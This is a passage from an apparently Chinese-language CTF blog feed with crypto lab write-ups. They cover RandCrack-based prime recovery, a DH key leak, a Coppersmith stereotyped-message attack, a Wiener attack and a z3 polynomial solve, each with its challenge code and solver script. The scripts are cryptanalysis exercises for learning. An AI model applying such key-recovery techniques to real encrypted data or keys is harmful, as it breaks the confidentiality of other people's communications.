f.readlines()<br>l = [<span class="hljs-built_in">int</span>(i.strip()) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> l]<br>t = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(l)):<br>    l[i]=<span class="hljs-built_in">pow</span>(l[i],d1,n1)<br>    t.append(l[i] &amp; (<span class="hljs-number">2</span> ** <span class="hljs-number">32</span> - <span class="hljs-number">1</span>))<br>    t.append(l[i] &gt;&gt; <span class="hljs-number">32</span>)<br><br>rc = RandCrack()<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> t:<br>    <span class="hljs-comment">#print(i)</span><br>    rc.submit(i)<br><br>p= gmpy2.next_prime(rc.predict_getrandbits(<span class="hljs-number">1024</span>))<br>q=gmpy2.next_prime(rc.predict_getrandbits(<span class="hljs-number">1024</span>))<br>phi=(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>e=<span class="hljs-number">0x10001</span><br>d=gmpy2.invert(e,phi)<br>n=<span class="hljs-number">282192787045300012512653348205023100633977961994319785455334878485878279155002597477586988139884708984967932299592184370913920154454529411340214002000184203858663348493798685214382285918768428977731739212686497807723945591897144193648675116590231356660052801887629464918391922154136991319586559816540237338585497480469612503603415205364509226801281944738737389838935248786451046766991788078169921109893699568857037445013576217368707802159332844126239428388993459172642776613311083103371374305339933633675017290937043850137562211032613075733292432423304470749812237194900717702085370608137840991471631835910828039687</span><br>m=<span class="hljs-number">259238822988977566695012424617063995573117089930208556670657599145025337427702878466226185238420864305947007012310554910092798322465348131913436133467234016346494141355781195340465361281577893230222262078303595408757793213981286451081005077114130101133457951582227249802820407016903011597830679808031094060911606519874888196020844361558955599635335257045010062614755515111267775986244493922725255973020330354340380649419924718935693718959879310778250636103417817054187661609076142747012790813043280864817735409842410276005950340121160775700206448447277295111684172139757988356188588207743329594782844076702075775387</span><br>flag=<span class="hljs-built_in">pow</span>(m,d,n)<br><span class="hljs-built_in">print</span>(long_to_bytes(flag))<br></code></pre></td></tr></table></figure><h2 id="8-DH-KeyExchange"><a href="#8-DH-KeyExchange" class="headerlink" title="8.DH KeyExchange"></a>8.DH KeyExchange</h2><p>描述：Diffie–Hellman key exchange</p><p>题目：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2 <span class="hljs-keyword">as</span> gp<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> md5<br><span class="hljs-keyword">from</span> secert <span class="hljs-keyword">import</span> flag<br>p=getPrime(<span class="hljs-number">1024</span>)<br>g=getPrime(<span class="hljs-number">512</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;g=&#x27;</span>,g)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;p=&#x27;</span>,p)<br>a=<span class="hljs-number">0</span><br>b=<span class="hljs-number">0</span><br>ga=<span class="hljs-number">0</span><br>gb=<span class="hljs-number">0</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Alice</span>():<br>    <span class="hljs-keyword">global</span> a,ga<br>    a=getPrime(<span class="hljs-number">256</span>)<br>    ga=<span class="hljs-built_in">pow</span>(g,a,p)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Send ga to Bob&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;error=&#x27;</span>,<span class="hljs-built_in">pow</span>(a,<span class="hljs-number">3</span>,p))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;ga=&#x27;</span>,ga)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Bob</span>():<br>    <span class="hljs-keyword">global</span> b,gb<br>    b=getPrime(<span class="hljs-number">256</span>)<br>    gb=<span class="hljs-built_in">pow</span>(g,b,p)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Send gb to Alice&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;gb=&#x27;</span>,gb)<br><br>Alice()<br>Bob()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Alice and Bob get DH-Share key&#x27;</span>)<br><br>DHK=<span class="hljs-built_in">pow</span>(ga,b,p)<br>key=md5(long_to_bytes(DHK)).digest()<br>m=<span class="hljs-built_in">bytearray</span>(flag)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(m)):<br>    m[i]^=key[i%<span class="hljs-built_in">len</span>(key)]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Bob send some msg to Alice&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;encrypt(msg)=&#x27;</span>,<span class="hljs-built_in">bytes</span>(m).<span class="hljs-built_in">hex</span>())<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">g= 7199947151944794743911938191312346311186611306678899110852230155357774215575917719720613403229095282480739081602074080660482475952411886691374043318448493</span><br><span class="hljs-string">p= 97071379036763365276185060009702438018060059206856674743686874316909319386927170094660286716995216225373017802186869259889328302258006874632267104922050738616270850048994498858195057639097114128036711175249438326521973436665358263778045161400707411132034853950961056374856163762269172994421007395785387103059</span><br><span class="hljs-string">Send ga to Bob</span><br><span class="hljs-string">error= 881681761739253172442857772706225151330302746756586376489925268091943264184425115085109100481393835444629535158137657368421836016339462893873981179504356604075768328761251143390945228646306818703037519765856937879989864912514135097</span><br><span class="hljs-string">ga= 65708183471844926985992964825075853484553072526922358645558996785901552532605944214487725147834632203915826964135364208892908582068610178200706759205767347561077987802682192194439893036351926227814471579658216696946856471440804990010187594204746483422748312873308593374062775017034883783201048756886218270623</span><br><span class="hljs-string">Send gb to Alice</span><br><span class="hljs-string">gb= 45971390223134075344933513264200628545702021313421202505710767209011084323131658270189445129369819992415170177788095881251796634672207375557418454489405801076356688074720248960577614548687530706591105879363287594643654495109209030376168385946422997485036113104259478539895821959224109446656561538368805688456</span><br><span class="hljs-string">Alice and Bob get DH-Share key</span><br><span class="hljs-string">Bob send some msg to Alice</span><br><span class="hljs-string">encrypt(msg)= f617c262caeedbd56414f6139fac7f06f34f8e3188beda9b6447fe4683b77c06f21f9b3386bdd98f3a0c</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><p>思路：</p><p>考察的背景是DH密钥交换协议，如果是只传输g^a和g^b的形势下，基于离散对数问题，由于攻击者不能解出a或者b,从而无法得知密钥(g^ab),但这里泄露了一个error=a^3%p,a^3=errpr+i*p，只需要爆破i,直到a^3能开3次就能解得a。拿到密钥后异或密文就能解得明文exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> md5<br><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">de</span>(<span class="hljs-params">c, e, n</span>):<br>    k = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        m = c + n*k<br>        result, flag = gmpy2.iroot(m, e)<br>        <span class="hljs-keyword">if</span> <span class="hljs-literal">True</span> == flag:<br>            <span class="hljs-keyword">return</span> result<br>        k += <span class="hljs-number">1</span><br><br>msg=<span class="hljs-string">&#x27;f617c262caeedbd56414f6139fac7f06f34f8e3188beda9b6447fe4683b77c06f21f9b3386bdd98f3a0c&#x27;</span><br>error= <span class="hljs-number">881681761739253172442857772706225151330302746756586376489925268091943264184425115085109100481393835444629535158137657368421836016339462893873981179504356604075768328761251143390945228646306818703037519765856937879989864912514135097</span><br>p= <span class="hljs-number">97071379036763365276185060009702438018060059206856674743686874316909319386927170094660286716995216225373017802186869259889328302258006874632267104922050738616270850048994498858195057639097114128036711175249438326521973436665358263778045161400707411132034853950961056374856163762269172994421007395785387103059</span><br>gb= <span class="hljs-number">45971390223134075344933513264200628545702021313421202505710767209011084323131658270189445129369819992415170177788095881251796634672207375557418454489405801076356688074720248960577614548687530706591105879363287594643654495109209030376168385946422997485036113104259478539895821959224109446656561538368805688456</span><br>a=de(error,<span class="hljs-number">3</span>,p)<br><span class="hljs-comment">#print(a)</span><br>dhk=<span class="hljs-built_in">pow</span>(gb,a,p)<br><span class="hljs-comment">#print(dhk)</span><br>m=<span class="hljs-built_in">int</span>(msg,<span class="hljs-number">16</span>)<br>m=m.to_bytes(<span class="hljs-number">42</span>,byteorder=<span class="hljs-string">&#x27;big&#x27;</span>)<br>key=md5(long_to_bytes(dhk)).digest()<br>m=<span class="hljs-built_in">bytearray</span>(m)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(m)):<br>    m[i]^=key[i%<span class="hljs-built_in">len</span>(key)]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;encrypt(msg)=&#x27;</span>,<span class="hljs-built_in">bytes</span>(m))<br></code></pre></td></tr></table></figure><h2 id="9-Msg-Leak"><a href="#9-Msg-Leak" class="headerlink" title="9.Msg Leak"></a>9.Msg Leak</h2><p>描述：部分明文已截获，但爆破仍很困难。</p><p>题目：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2 <span class="hljs-keyword">as</span> gp<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> secert <span class="hljs-keyword">import</span>  flag<br>m=bytes_to_long(flag)<br>e=<span class="hljs-number">3</span><br>p,q=getPrime(<span class="hljs-number">256</span>),getPrime(<span class="hljs-number">256</span>)<br>n=p*q<br>c=<span class="hljs-built_in">pow</span>(m,e,n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;mh=&#x27;</span>,m&gt;&gt;<span class="hljs-number">80</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;n=&#x27;</span>,n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;c=&#x27;</span>,c)<br><span class="hljs-comment"># mh= 46327402297734757031745950241741627565757588640756971200369624429224173593654</span><br><span class="hljs-comment"># n= 7157139167356678714370725279674911894659598104764414968321971134586820296165041363873577647712321668375351067630372758818726465378119944606636981711810073</span><br><span class="hljs-comment"># c= 2160239175676922207278878288654803168952013857981592751259352597514122045326021069595917292090487352011644713503340085289734865810178423876875704797499000</span><br><br></code></pre></td></tr></table></figure><p>思路：</p><p>若e较小，并且已知m的高位，可以用Stereotyped messages攻击</p><p>本质就是m=mH+mL</p><p>c=(mH+mL)^e%n  (其中e,mH,c,n已知)</p><p>可以利用sage解mL</p><p>其实开始我想的是低指数加密的话，能不能直接爆破，但跑了一会代码没有解出来，可能是k比较大</p><p>exp:</p><p>解出低位的密文，在sagemath上运行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">e=<span class="hljs-number">3</span><br>mh= <span class="hljs-number">46327402297734757031745950241741627565757588640756971200369624429224173593654</span><br>n=<span class="hljs-number">7157139167356678714370725279674911894659598104764414968321971134586820296165041363873577647712321668375351067630372758818726465378119944606636981711810073</span><br>c=<span class="hljs-number">2160239175676922207278878288654803168952013857981592751259352597514122045326021069595917292090487352011644713503340085289734865810178423876875704797499000</span><br>mh=mh&lt;&lt;<span class="hljs-number">80</span><br>kbits=<span class="hljs-number">80</span><br>PR.&lt;x&gt; = PolynomialRing(Zmod(n))<br>f = (mh +x  )^e-c<br>x0 = f.small_roots(X=<span class="hljs-number">2</span>^kbits, beta=<span class="hljs-number">1</span>)[<span class="hljs-number">0</span>]<br><span class="hljs-built_in">print</span>(x0)<br></code></pre></td></tr></table></figure><p><img src="https://testingcf.jsdelivr.net/gh/c1ongyan/picture@main/img/202211201549804.png" alt="image-20221120154934698"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>mh= <span class="hljs-number">46327402297734757031745950241741627565757588640756971200369624429224173593654</span><br>flag1=long_to_bytes(mh)<br>x=<span class="hljs-number">463795129964060779034237</span><br>flag2=long_to_bytes(x)<br><span class="hljs-built_in">print</span>(flag1+flag2)<br></code></pre></td></tr></table></figure><h2 id="10-WienerAttack"><a href="#10-WienerAttack" class="headerlink" title="10.WienerAttack"></a>10.WienerAttack</h2><p>描述：针对私钥的攻击之一</p><p>题目：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">e= <span class="hljs-number">18437613570247445737704630776150775735509244525633303532921813122997549954741828855898842356900537746647414676272022397989161180996467240795661928117273837666615415153571959258847829528131519423486261757569454011940318849589730152031528323576997801788206457548531802663834418381061551227544937412734776581781</span><br>n= <span class="hljs-number">147282573611984580384965727976839351356009465616053475428039851794553880833177877211323318130843267847303264730088424552657129314295117614222630326581943132950689147833674506592824134135054877394753008169629583742916853056999371985307138775298080986801742942833212727949277517691311315098722536282119888605701</span><br>c= <span class="hljs-number">145315647191497019511913572210180391238613049936119235228772026554133059542159751725097547375996532383890169938333688224536228845033068326488878181934545739369621090166294084165318648082318439346944358636126464531405163620742952602028478064939264983117774075720743903435079935176944935376511986457592440638085</span><br></code></pre></td></tr></table></figure><p>思路：</p><p>e较大 n也非常大 不需要 分解n得到p和q 直接使用维纳攻击可以求d</p><p>(维纳攻击是利用连分数求解，没有学过，暂时不写理解了)</p><p>利用现有模块：<a href="https://github.com/pablocelayes/rsa-wiener-attack">https://github.com/pablocelayes/rsa-wiener-attack</a></p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> RSAwienerHacker <span class="hljs-keyword">import</span> hack_RSA<br><span class="hljs-keyword">import</span> libnum<br>e= <span class="hljs-number">18437613570247445737704630776150775735509244525633303532921813122997549954741828855898842356900537746647414676272022397989161180996467240795661928117273837666615415153571959258847829528131519423486261757569454011940318849589730152031528323576997801788206457548531802663834418381061551227544937412734776581781</span><br>n= <span class="hljs-number">147282573611984580384965727976839351356009465616053475428039851794553880833177877211323318130843267847303264730088424552657129314295117614222630326581943132950689147833674506592824134135054877394753008169629583742916853056999371985307138775298080986801742942833212727949277517691311315098722536282119888605701</span><br>c= <span class="hljs-number">145315647191497019511913572210180391238613049936119235228772026554133059542159751725097547375996532383890169938333688224536228845033068326488878181934545739369621090166294084165318648082318439346944358636126464531405163620742952602028478064939264983117774075720743903435079935176944935376511986457592440638085</span><br>d=hack_RSA(e,n)<br>m=<span class="hljs-built_in">pow</span>(c ,d ,n)<br><span class="hljs-built_in">print</span>(libnum.n2s(m))<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>Crypto</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Crypto-Lab2</title>
    <link href="/post/Crypto-Lab2.html"/>
    <url>/post/Crypto-Lab2.html</url>
    
    <content type="html"><![CDATA[<h1 id="Crypto-Lab2"><a href="#Crypto-Lab2" class="headerlink" title="Crypto-Lab2"></a>Crypto-Lab2</h1><h2 id="1-Solve"><a href="#1-Solve" class="headerlink" title="1.Solve"></a>1.Solve</h2><p>描述：poly、matrix 可以尝试多种方式求解，推荐sagemath</p><p>提示：线性方程组或者是 多元多项式的根</p><p>题目：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> secert <span class="hljs-keyword">import</span> flag<br>a = getPrime(<span class="hljs-number">256</span>)<br>b = getPrime(<span class="hljs-number">256</span>)<br>c = getPrime(<span class="hljs-number">256</span>)<br>d = bytes_to_long(flag)<br>n = getStrongPrime(<span class="hljs-number">2048</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">poly</span>(<span class="hljs-params">x</span>):<br>    <span class="hljs-keyword">return</span> (a * x ** <span class="hljs-number">3</span> + b * x ** <span class="hljs-number">2</span> + c * x + d) % n<br><span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>    x = getRandomNBitInteger(<span class="hljs-number">256</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;(<span class="hljs-subst">&#123;x&#125;</span>, <span class="hljs-subst">&#123;poly(x)&#125;</span>)&#x27;</span>)<br><br><span class="hljs-built_in">print</span>(n)<br><span class="hljs-comment"># (60002354876251355965151562461247480482515496917741490298630771974220930616675, 14181596274179526270805648290965819183528910754084659334605288823011431923494810964618766383224468657336083499258652848323435316206518871238278390527952953233408140711018765090665412398441127680243810022418572215280840348762490378846576762238657647443827970992465977448622826233543588521900433003381689305190)</span><br><span class="hljs-comment"># (58317991346743938885993146146362677289105991977049568233220781228102038659484, 13020507237617729101718169310293495896780990322849291274557306869164121907152343623103434927547806240534514353324680741670730400192907493220067190327715636790469225408448798957817955019606110374482663353526138246279563848414962592714024348009716085769623595857071669185084613855032160704801649492912935317281)</span><br><span class="hljs-comment"># (109801116737516263821905127008163207467616293313761078189248696049962628110949, 86904147451931807955533431713083983944972076149471934932594655101733780670944036591700055783164601235570340269628067942075097931238498118411256150059286615793580571727917569247675631324066425438239734529864493547038967164455855057637662611807397083364424800853855512915617156269333736827491103562091873714726)</span><br><span class="hljs-comment"># (109520698511811251058487504853775804612539348423792492555579233854741004839310, 86240019693849224437564934457396859854220939969432917244576569005011506620714157380158981500421291449351366433310370141191675695372289703300696385884236633200503092443813042966281339361996433319009234365291250050889452052769388812530848281725044074009032309997114549110114740708601370953679197280682793278275)</span><br><span class="hljs-comment"># 25984447105840144204726140518647900810784318911045573112702803720063269869257246042781455515220370300371322369266627365164963900956417121636243251367488604111626434846517930558172038293909575081418247263246677965935401509016648320330056450224647570170228839618324017216433438353329486961004973591440745242575179169717586964468085738007027674627155651009822600433194871839925969830314107920656674510625530946074904257516348409397307237681561961003851975377309117862295975361599123005804187055793580478466920231809749203892985196997737336922757484520071802590727361629983940666693096733397198360027049521098899469448853</span><br><br></code></pre></td></tr></table></figure><p>思路：</p><p>很明显四个方程解四个未知量，而且如果不看%n则为线性方程，一开始没有注意到模n对解方程的影响，用工具(sage,z3)一直解不出来(saeg会报错，z3跑不出来)，最后想着n挺大的，a,b,c,d位数相对还挺小，直接将模n加到由于3次和2次后导致过大的x上，然后就解出来了</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>a=Int(<span class="hljs-string">&#x27;a&#x27;</span>)<br>b=Int(<span class="hljs-string">&#x27;b&#x27;</span>)<br>c=Int(<span class="hljs-string">&#x27;c&#x27;</span>)<br>d=Int(<span class="hljs-string">&#x27;d&#x27;</span>)<br>n=Int(<span class="hljs-string">&#x27;n&#x27;</span>)<br>s=Solver()<br>s.add(n==<span class="hljs-number">25984447105840144204726140518647900810784318911045573112702803720063269869257246042781455515220370300371322369266627365164963900956417121636243251367488604111626434846517930558172038293909575081418247263246677965935401509016648320330056450224647570170228839618324017216433438353329486961004973591440745242575179169717586964468085738007027674627155651009822600433194871839925969830314107920656674510625530946074904257516348409397307237681561961003851975377309117862295975361599123005804187055793580478466920231809749203892985196997737336922757484520071802590727361629983940666693096733397198360027049521098899469448853</span>)<br>s.add((a * (<span class="hljs-number">60002354876251355965151562461247480482515496917741490298630771974220930616675</span> ** <span class="hljs-number">3</span>%n) + b * (<span class="hljs-number">60002354876251355965151562461247480482515496917741490298630771974220930616675</span> ** <span class="hljs-number">2</span>%n) + c *<span class="hljs-number">60002354876251355965151562461247480482515496917741490298630771974220930616675</span> + d) ==<span class="hljs-number">14181596274179526270805648290965819183528910754084659334605288823011431923494810964618766383224468657336083499258652848323435316206518871238278390527952953233408140711018765090665412398441127680243810022418572215280840348762490378846576762238657647443827970992465977448622826233543588521900433003381689305190</span>)<br>s.add((a * (<span class="hljs-number">58317991346743938885993146146362677289105991977049568233220781228102038659484</span> ** <span class="hljs-number">3</span> %n)+ b * (<span class="hljs-number">58317991346743938885993146146362677289105991977049568233220781228102038659484</span> ** <span class="hljs-number">2</span> %n)+ c * <span class="hljs-number">58317991346743938885993146146362677289105991977049568233220781228102038659484</span>+ d) ==<span class="hljs-number">13020507237617729101718169310293495896780990322849291274557306869164121907152343623103434927547806240534514353324680741670730400192907493220067190327715636790469225408448798957817955019606110374482663353526138246279563848414962592714024348009716085769623595857071669185084613855032160704801649492912935317281</span>)<br>s.add((a * (<span class="hljs-number">109801116737516263821905127008163207467616293313761078189248696049962628110949</span> ** <span class="hljs-number">3</span>%n) + b *( <span class="hljs-number">109801116737516263821905127008163207467616293313761078189248696049962628110949</span> ** <span class="hljs-number">2</span>%n) + c * <span class="hljs-number">109801116737516263821905127008163207467616293313761078189248696049962628110949</span> + d) ==<span class="hljs-number">86904147451931807955533431713083983944972076149471934932594655101733780670944036591700055783164601235570340269628067942075097931238498118411256150059286615793580571727917569247675631324066425438239734529864493547038967164455855057637662611807397083364424800853855512915617156269333736827491103562091873714726</span>)<br>s.add((a * (<span class="hljs-number">109520698511811251058487504853775804612539348423792492555579233854741004839310</span> ** <span class="hljs-number">3</span>%n) + b *( <span class="hljs-number">109520698511811251058487504853775804612539348423792492555579233854741004839310</span> ** <span class="hljs-number">2</span>%n )+ c * <span class="hljs-number">109520698511811251058487504853775804612539348423792492555579233854741004839310</span> + d) ==<span class="hljs-number">86240019693849224437564934457396859854220939969432917244576569005011506620714157380158981500421291449351366433310370141191675695372289703300696385884236633200503092443813042966281339361996433319009234365291250050889452052769388812530848281725044074009032309997114549110114740708601370953679197280682793278275</span>)<br><span class="hljs-keyword">if</span> s.check()==sat:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;have result&#x27;</span>)<br>res=s.model()<br><span class="hljs-built_in">print</span>(res)<br><span class="hljs-keyword">else</span>:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;no result&#x27;</span>)<br><span class="hljs-comment">#d = 56006392793403656735538704089732107703878971419442672690342926545436898285415526975954922123503952765</span><br>x=<span class="hljs-number">56006392793403656735538704089732107703878971419442672690342926545436898285415526975954922123503952765</span><br><span class="hljs-built_in">print</span>(long_to_bytes(x))<br></code></pre></td></tr></table></figure><h2 id="2-DES-ECB"><a href="#2-DES-ECB" class="headerlink" title="2.DES ECB"></a>2.DES ECB</h2><p>描述：Hacker截获了一段密文以及一个密码本 </p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Cipher</span>: <span class="hljs-number">1802</span>ECB69C01A50D3CB646F53F13C68ACAAE1D0A6D1BAE0FB6C7D1FECB938DE7F24C3DECA97051C47C78F0D139AE8AD6298FAB0EE3C3ECD96489B7EA7A09424C3CFA92C5E635D5023E3163DCE49B5F7EBC77CAB8C1547A2D<br></code></pre></td></tr></table></figure><p>这题非常简单给了个电码本，对着解就行</p><h2 id="3-invert"><a href="#3-invert" class="headerlink" title="3.invert?"></a>3.invert?</h2><p>描述：no invert? can you solve it?</p><p>题目：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> lcm , powmod , invert , gcd , mpz<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> secert <span class="hljs-keyword">import</span> flag<br>p = getPrime(<span class="hljs-number">1024</span>)<br>q = getPrime(<span class="hljs-number">1024</span>)<br>n = p * q<br>gift = lcm(p - <span class="hljs-number">1</span> , q - <span class="hljs-number">1</span>)<br>e = <span class="hljs-number">54722</span><br>m= bytes_to_long(flag)<br>c = powmod(m , e , n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;n=&#x27;</span> , n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;gift=&#x27;</span> , gift)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;c=&#x27;</span> , c)<br><span class="hljs-comment"># n= 13664620234268901160055157247810665534349606023583951420372422169980992482998282536609067846401224024893066810784542670052707748948158449361132096680752338924381061874032410822445466886973939158230664282005372981552891918244652335988091160966855312167853338112228528219379964882771499536900048185888146415807593225500175392699331500194180680998666327780919649132702014011099987148622347120192850640457559883941134333727953211765174494834095911596551947418012849825730886258560864450424104967263344231516697424438684502027180505170641536099213842597878883033558282380085962932092759358698239326823009982345606749664091</span><br><span class="hljs-comment"># gift= 1366462023426890116005515724781066553434960602358395142037242216998099248299828253660906784640122402489306681078454267005270774894815844936113209668075233892438106187403241082244546688697393915823066428200537298155289191824465233598809116096685531216785333811222852821937996488277149953690004818588814641580735290146084660706449913291537470699789021589215478593372364630200882723709027811226070626400160397860596521904137974856987602831701814180202522608228505910412389032159081877001557604329433230532473043077795526030613329256349472056374011129705595257285454877937498732149500869239439008656105244829186841725600</span><br><span class="hljs-comment"># c= 